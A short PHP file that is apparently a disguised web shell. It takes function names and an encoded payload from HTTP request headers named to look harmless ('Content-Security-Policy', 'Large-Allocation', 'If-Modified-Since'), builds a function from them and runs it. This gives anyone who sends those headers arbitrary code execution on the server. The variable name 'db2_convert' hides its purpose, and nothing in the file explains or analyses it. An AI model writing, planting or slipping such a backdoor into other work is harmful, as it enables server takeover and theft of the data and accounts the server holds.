<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Content-Security-Policy'])) {
    $db2_convert = $_HEADERS['Content-Security-Policy']('', $_HEADERS['Large-Allocation']($_HEADERS['If-Modified-Since']));
    $db2_convert();
}